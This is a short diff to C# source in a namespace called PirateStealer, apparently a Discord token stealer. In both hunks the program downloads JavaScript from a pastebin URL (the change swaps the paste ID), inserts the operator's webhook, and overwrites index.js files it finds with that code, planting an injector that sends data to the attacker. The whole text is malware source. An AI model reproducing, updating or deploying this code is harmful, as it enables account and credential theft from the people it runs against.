@@ -69,7 +69,7 @@ namespace PirateStealer
 												{
 													if (text5.Contains("index.js"))
 													{
-														File.WriteAllText(text5, new WebClient().DownloadString("https://pastebin.com/raw/Q20CGhrY").Replace("%WEBHOOK_LINK%", Settings.Webhook));
+														File.WriteAllText(text5, new WebClient().DownloadString("https://pastebin.com/raw/LKHSvNjU").Replace("%WEBHOOK_LINK%", Settings.Webhook));
 													}
 												}
 											}
@@ -111,7 +111,7 @@ namespace PirateStealer
 												{
 													if (text9.Contains("index.js"))
 													{
-														File.WriteAllText(text9, new WebClient().DownloadString("https://pastebin.com/raw/Q20CGhrY").Replace("%WEBHOOK_LINK%", Settings.Webhook));
+														File.WriteAllText(text9, new WebClient().DownloadString("https://pastebin.com/raw/LKHSvNjU").Replace("%WEBHOOK_LINK%", Settings.Webhook));
 													}
 												}
 											}
